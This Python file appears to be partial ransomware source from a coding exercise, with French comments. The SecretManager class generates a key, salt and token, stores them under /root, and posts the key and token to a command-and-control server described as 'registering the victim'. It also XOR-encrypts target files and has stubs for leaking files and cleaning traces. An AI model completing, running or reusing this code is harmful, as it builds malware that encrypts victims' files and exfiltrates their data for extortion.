from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # derive
        kdf= PBKDF2HMAC(algorithm=hashes.SHA256(),length=self.KEY_LENGTH,salt=salt,iterations=self.ITERATION,)
        return kdf.derive(key)

    def create(self)->Tuple[bytes, bytes, bytes]:
        salt = secrets.token_bytes(nbytes=self.SALT_LENGTH)
        key = secrets.token_bytes(nbytes=self.KEY_LENGTH)
        token=self.do_derivation(salt,key)
        return salt,key,token

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        response = requests.post('http://host/6666/', json={"token" : self.bin_to_b64(token),"salt" : self.bin_to_b64(salt),"key" : self.bin_to_b64(key)})

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc

        salt,key,token=self.create()#creation données cryptographiques

        #on créer le repertoire de stockage en local
        dir_path= os.path.join(self._path, 'token')#on se place au /root/token
        os.makedirs(dir_path, exist_ok=True)#on créer le répertoire

        #sauvegarde du token dans token.bin
        path = os.path.join(self._path,'token.bin')
        if os.path.exists(path)==False:#on vérifie qu'il n'y est pas deja un fichier token.bin 
            with open(path, "wb") as f:
                f.write(token)

            #sauvegarde du salt dans salt.bin
            path = os.path.join(self._path,'salt.bin')
            with open(path, "wb") as f:
                f.write(salt)

            self.post_new(salt,key,token)
        else:
            print("Un fichier token.bin existe déja, surement une précedente cible ;)")


    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        hex_token= sha256(self._token).hexdigest()#token en sha256 puis en hexa
        return hex_token

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file_path in files:
            xorfile(file_path,self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()